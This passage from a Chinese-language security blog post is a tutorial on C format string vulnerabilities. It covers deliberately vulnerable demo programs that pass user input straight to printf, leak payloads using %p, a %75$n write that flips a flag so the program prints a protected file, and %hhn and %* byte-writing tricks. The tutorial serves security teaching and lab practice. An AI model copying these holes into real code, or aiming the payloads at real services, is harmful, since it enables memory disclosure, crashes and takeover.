+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> fmt_str[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *secret_value = <span class="string">&quot;my secret value&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(fmt_str, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">strcat</span>(fmt_str, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(fmt_str, <span class="number">0xBEEF1337</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&quot;leak:%p&quot;</span></span><br><span class="line">leak:<span class="number">0xbeef1337</span></span><br><span class="line"></span><br><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&quot;leak:%p %p %p %P&quot;</span></span><br><span class="line">leak:<span class="number">0xbeef1337</span> <span class="number">0x10</span> (nil) %P</span><br></pre></td></tr></table></figure>
+
+<p>那么如何获取到secret_value值呢，它在栈上，理论上来说只要一直%p就有机会读到一个像栈地址的值</p>
+<p>使用$可以读取指定位置的参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">7</span>$x - print the <span class="number">7</span>th <span class="title function_">parameter</span> <span class="params">(on the <span class="built_in">stack</span>)</span><span class="comment">//打印栈上的第七个值</span></span><br></pre></td></tr></table></figure>
+
+<p>但是我这里是不行的</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.001.8z6hda2ird.webp"
+                       
+                 ></p>
+<p>作者这里是能成功的</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.002.pfap28evc.webp"
+                       
+                 ></p>
+<p>怀疑是不同版本安全策略的问题，栈地址到别的地方去了</p>
+<p><strong>一些小技巧总结</strong></p>
+<blockquote>
+<ol>
+<li><p>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</p>
+</li>
+<li><p>利用%s来获取变量所对应地址的内容，只不过有零截断。</p>
+</li>
+<li><p>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>用户不能直接提供字符串，而是由他们的行为自动生成。可能导致printf错误解析数据，比如使用%s解析一个指针。</p>
+<p>不需要计算出具体的位置，只需要输入一大堆%s,遇到无法解析的就可以使程序产生错误，这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
+<h2 id="内存覆盖（写入数据）"><a href="#内存覆盖（写入数据）" class="headerlink" title="内存覆盖（写入数据）"></a>内存覆盖（写入数据）</h2><p>%n会对传入的指针解引用，然后把已输出的字符串的字节数写到该地址，使用%n可以在输出的同时知道字符的长度</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> namelength;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%n&quot;</span>, name, &amp;namelength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The name was %d bytes long!&quot;</span>, namelength);</span><br></pre></td></tr></table></figure>
+
+<p>demo</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> fmt_str[<span class="number">256</span>];</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="type">int</span> *print_flag=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        *print_flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *secret_value = <span class="string">&quot;my secret value&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(fmt_str, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">strcat</span>(fmt_str, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(fmt_str, <span class="number">0xBEEF1337</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(*print_flag)&#123;</span><br><span class="line">                <span class="type">int</span> fd=open(<span class="string">&quot;/catflag&quot;</span>,O_RDONLY);</span><br><span class="line">                read(fd,buf,<span class="number">256</span>);</span><br><span class="line">                write(<span class="number">1</span>,buf,<span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(pwn㉿kali)-[~/桌面]</span><br><span class="line">└─$ ./<span class="keyword">do</span> <span class="string">&#x27;%x&#x27;</span></span><br><span class="line">beef1337</span><br></pre></td></tr></table></figure>
+
+<p>使用gdb进行调试，在main下断点，然后运行</p>
+<p>反编译main函数，找到 if(*print_flag)在哪开始比较</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.003.8z6hda2tzn.webp"
+                       
+                 ></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test eax, eax 进行的是按位与运算（AND 操作）。对于寄存器 eax，执行的是 eax &amp; eax。</span><br><span class="line">由于任何值与自身按位与的结果就是自身，所以这条指令的结果要么是非零值，要么是零：</span><br><span class="line">如果 eax 中的值是 <span class="number">0</span>，那么 eax &amp; eax = <span class="number">0</span>。</span><br><span class="line">如果 eax 中的值不是 <span class="number">0</span>，那么 eax &amp; eax ≠ <span class="number">0</span>。</span><br></pre></td></tr></table></figure>
+
+<p>这一段可能是在进行比较，后面有个je可以执行跳转</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401216</span> &lt;+<span class="number">144</span>&gt;:   call   <span class="number">0x401060</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"><span class="number">0x000000000040121b</span> &lt;+<span class="number">149</span>&gt;:   mov    rax,QWORD PTR [rbp<span class="number">-0x8</span>]</span><br><span class="line"><span class="number">0x000000000040121f</span> &lt;+<span class="number">153</span>&gt;:   mov    eax,DWORD PTR [rax]</span><br><span class="line"><span class="number">0x0000000000401221</span> &lt;+<span class="number">155</span>&gt;:   test   eax,eax</span><br><span class="line"><span class="number">0x0000000000401223</span> &lt;+<span class="number">157</span>&gt;:   je     <span class="number">0x401273</span> &lt;main+<span class="number">237</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401225</span> &lt;+<span class="number">159</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x000000000040122a</span> &lt;+<span class="number">164</span>&gt;:   lea    rax,[rip+<span class="number">0xde3</span>]        # <span class="number">0x402014</span></span><br></pre></td></tr></table></figure>
+
+<p><u>eax&#x3D;rax rax&#x3D;rbp-0x8</u></p>
+<p>现在输出rbp-0x8 rsp和它们之间的距离</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.004.2donm8ytr8.webp"
+                       
+                 ></p>
+<p>当printf向前查找参数时，步长为8字节（一个参数8字节）0x228 &#x2F;0x8&#x3D;69，第六个参数是第一个栈上的参数，69+6&#x3D;75，我们可以认为从printf的角度看，print_flag是它的第75个参数</p>
+<p>.&#x2F;do ‘a%75$n’ 可以把a的长度1输入到第75个参数位置上，这样就能达成读取文件的目的</p>
+<p>输出了a和一些buf中未初始化的内容</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.005.7sn64oe0wm.webp"
+                       
+                 ></p>
+<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ul>
+<li>rbp原理</li>
+</ul>
+<p>栈上保存的RBP指向前一个栈帧的RBP，能在字符串漏洞中利用，找到第一个保存的RBP，这里的ebp1的距离，ebp1指向一个地址，这里是ebp2,所以可以编写一个漏洞，写入数据到ebp1指向的地址既ebp2,然后就可以找到ebp2的距离（找写入值在第几个参数，再写入数据到ebp2指向的地址。</p>
+<p>这样就可以通过ebp1将真正想要写入的地址写到ebp2,再通过ebp2写入数据到我们选定的地址。通过这样的方法，尽管有ASLR,我们还是能写</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.006.92q3azw1tw.webp"
+                       
+                 ></p>
+<ul>
+<li>当格式化字符串的缓冲区在栈上时，我们可以控制格式化字符串缓冲区</li>
+</ul>
+<p>在printf被调用时，发生了什么</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.007.6m3uw2p7kl.webp"
+                       
+                 ></p>
+<p>格式化字符串下会有一个栈帧（不是紧挨着),这意味着应该能找到从RSP到格式化字符串缓冲区的偏移量，</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.008.2vepau0dvq.webp"
+                       
+                 ></p>
+<ul>
+<li>写入更多字节</li>
+</ul>
+<p>%n只能写入4字节，但如果想写入更多字节呢</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%ln   <span class="number">8b</span>ytes</span><br><span class="line">%hn   <span class="number">2b</span>ytes</span><br><span class="line">%hhn  <span class="number">1b</span>ytes</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>写入特定字节</li>
+</ul>
+<p>可以利用printf的另一个特性——填充 参考printf的man page,命令为：<code>man 3 printf</code></p>
+<p>这里提供了一个比较大的填充，所以会在16进制数前输出大量空白字符，这些都会输出到标准输出。printf的第二个替换符是%1$n,这里表示引用第一个参数既buf,但因为后面有个n,这个替换符将把已输出的字节长度写入buf,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%1145258561x%1$n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据关系如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HEX  <span class="number">4443</span> <span class="number">4241</span></span><br><span class="line">DEC  <span class="number">1</span>,<span class="number">145</span>,<span class="number">258</span>,<span class="number">561</span></span><br></pre></td></tr></table></figure>
+
+<p>按小端序写入 <code>buf</code> 后，就是41，42，43，44，分别对应ABCD,最终write(1, buf, 4) 输出这 4 个字节</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.009.3d4qzf1svn.webp"
+                       
+                 ></p>
+<p>但这个非常耗时间，填充了1,145,258,561，这还只是4字节，如果要写入一个8字节地址更费时间</p>
+<ul>
+<li>写入更多特定字节</li>
+</ul>
+<p>这个方法不需要输入太多填充空白字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%65x%1$hhn%c%2$hhn%c%3$hhn%c%4$hhn&quot;</span>, buf, buf+<span class="number">1</span>, buf+<span class="number">2</span>, buf+<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>逐步分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">65</span>x：</span><br><span class="line">输出 <span class="number">65</span> 个字符（通常是空格），使得当前已经输出的字符数为 <span class="number">65</span>。</span><br><span class="line">%<span class="number">1</span>$hhn：</span><br><span class="line">%n 占位符会将目前输出的字符数写入指定的内存地址。</span><br><span class="line">%<span class="number">1</span>$hhn 这里表示将**已经输出的字符数（<span class="number">65</span>）**的低 <span class="number">8</span> 位写入 buf[<span class="number">0</span>]（即 buf 的第一个字节）。</span><br><span class="line">结果是 buf[<span class="number">0</span>] 将存储值 <span class="number">65</span>，即字符 <span class="string">&#x27;A&#x27;</span>（ASCII 码 <span class="number">65</span>）。</span><br><span class="line">%c：</span><br><span class="line">这是一个普通字符输出占位符，用于将参数中的字符输出到终端。</span><br><span class="line">第一个 %c 对应 buf+<span class="number">1</span>，buf+<span class="number">1</span> 的初始值未定义，因此输出的字符是不确定的。</span><br><span class="line">%<span class="number">2</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">66</span>）**写入 buf[<span class="number">1</span>]（第二个字节）。</span><br><span class="line">结果是 buf[<span class="number">1</span>] 将存储值 <span class="number">66</span>，即字符 <span class="string">&#x27;B&#x27;</span>（ASCII 码 <span class="number">66</span>）。</span><br><span class="line">%c：</span><br><span class="line">输出 buf+<span class="number">2</span> 的值，未定义，输出的字符不确定。</span><br><span class="line">%<span class="number">3</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">67</span>）**写入 buf[<span class="number">2</span>]（第三个字节）。</span><br><span class="line">结果是 buf[<span class="number">2</span>] 将存储值 <span class="number">67</span>，即字符 <span class="string">&#x27;C&#x27;</span>（ASCII 码 <span class="number">67</span>）。</span><br><span class="line">%c：</span><br><span class="line">输出 buf+<span class="number">3</span> 的值，未定义，输出的字符不确定。</span><br><span class="line">%<span class="number">4</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">68</span>）**写入 buf[<span class="number">3</span>]（第四个字节）。</span><br><span class="line">结果是 buf[<span class="number">3</span>] 将存储值 <span class="number">68</span>，即字符 <span class="string">&#x27;D&#x27;</span>（ASCII 码 <span class="number">68</span>）。</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.010.1e8k92wc7c.webp"
+                       
+                 ></p>
+<p>需要注意的是，ABCD是递增的，这样构造格式化字符串相对简单，但如果是要写DCBA这种递减的值呢</p>
+<ul>
+<li>动态填充大小</li>
+</ul>
+<p>动态填充大小用*指定，它能让你不再依靠硬编码指定填充长度，你可以在另一个参数中指定填充长度，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%*<span class="number">10</span>$c%<span class="number">11</span>$n</span><br></pre></td></tr></table></figure>
+
+<p><code>%*10$c</code>会把第十个参数当作一个数字，表示需要在c前填充的空白字节长度</p>
+<p><code>11$n</code>会将已输出的字节数写入到给定地址，这会把这个计数写到第十一个参数指定的地址。这直接能拷贝内存了（10th的值拷到了11th的地址处）</p>
+<p>假设第 10 个参数的值为 100，第 11 个参数指向一个重要的内存地址，比如栈上保存的返回地址或者全局变量的地址。那么这条指令会在输出了 100 个字符之后，将字符数（比如 100）写入第 11 个参数指向的内存地址，这可能导致程序行为异常或者被攻击者控制</p>
+<p>但这个用法不太实际，这里不好一次只写一个字节，如果尝试使用这种技术复制整个地址，会输出大量内容。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/" >https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/format-string-exploits/" >https://pwn.college/software-exploitation/format-string-exploits/<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                格式化字符串漏洞
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2024/09/16/格式化字符串漏洞/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">arch3rn4r</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2024-09-16 21:07</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2024/09/18/%E5%8A%A8%E6%80%81%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"
+                                   title="动态符号执行"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">动态符号执行</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script 
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'arch3rn4r/arch3rn4r.github.io')
+              script.setAttribute('data-repo-id', 'R_kgDOLnMFhw')
+              script.setAttribute('data-category', 'Announcements')
+              script.setAttribute('data-category-id', 'DIC_kwDOLnMFh84Cik-D')
+              script.setAttribute('data-reactions-enabled', '0')
+              script.setAttribute('data-lang', 'zh-CN')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('false' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-text">格式化字符串漏洞的条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="nav-text">其他格式化字符串函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F"><span class="nav-text">内存泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露栈地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="nav-text">拒绝服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96%EF%BC%88%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-text">内存覆盖（写入数据）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="nav-text">其他方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 